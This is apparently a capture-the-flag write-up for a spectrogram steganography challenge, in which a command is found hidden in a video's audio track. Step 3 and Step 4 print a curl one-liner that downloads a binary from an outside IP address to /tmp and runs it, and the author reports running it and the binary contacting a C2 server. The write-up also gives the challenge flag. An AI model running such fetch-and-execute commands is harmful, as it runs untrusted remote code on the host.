# Sorry, you're NOT a sigma! – Spectrogram Steganography Challenge Writeup

## Challenge Metadata
**Challenge Name:** Sorry, you're NOT a sigma!
**SHA256 Hash:** 66591540e5dd8e925128513d1ca0810118350c822429e4e8c1d1a98b7d8924f3  
**Challenge Type:** Steganography  
**Technique Used:** Spectrogram-based steganography embedded in audio stream

---

## Step-by-Step Solution

### Step 1: Initial Analysis
The video file `lion.mp4` was inspected using `ffmpeg` to confirm audio streams existed. This revealed multiple audio tracks, including one at a sample rate of 22050 Hz.

### Step 2: Extract Audio
Extracted the audio to a standalone file for better analysis.

```bash
ffmpeg -i lion.mp4 -vn -acodec copy track2.aac
```

### Step 3: Spectrogram Visualization in Audacity
1. Imported `track2.aac` into Audacity.
2. Right-clicked the track name and changed the view to `Spectrogram`.
3. Zoomed and adjusted settings for clarity.

The spectrogram revealed the following text visually embedded in the waveform:
![image](https://github.com/user-attachments/assets/76420728-ab8b-4970-804c-17e28c4d154a)


```
curl -s http://23.179.17.40:6969/roar -o /tmp/roar && chmod +x /tmp/roar && /tmp/roar
```

### Step 4: Command Execution
Ran the embedded command to fetch and execute a payload:

```bash
curl -s http://23.179.17.40:6969/roar -o /tmp/roar && chmod +x /tmp/roar && /tmp/roar
```

### Step 5: Beaconing and Response
The binary beaconed to the C2 server. After multiple attempts, it successfully contacted the server and decrypted the response:

```
[+] Flag received:
CIT{wh3n_th3_l10n_sp34k5_y0u_l1st3n}
```

---

## Key Concepts and Techniques

- Spectrogram steganography hides data in the frequency domain of audio.
- Audacity or Sonic Visualiser is commonly used to reveal these embeddings.
- Commonly used in CTFs for hiding text, commands, or QR codes in audio waveforms.

---

## Flag
```
CIT{wh3n_th3_l10n_sp34k5_y0u_l1st3n}
```

![image](https://github.com/user-attachments/assets/daa1836b-2227-4fca-b665-37a3ed2cbc4e)

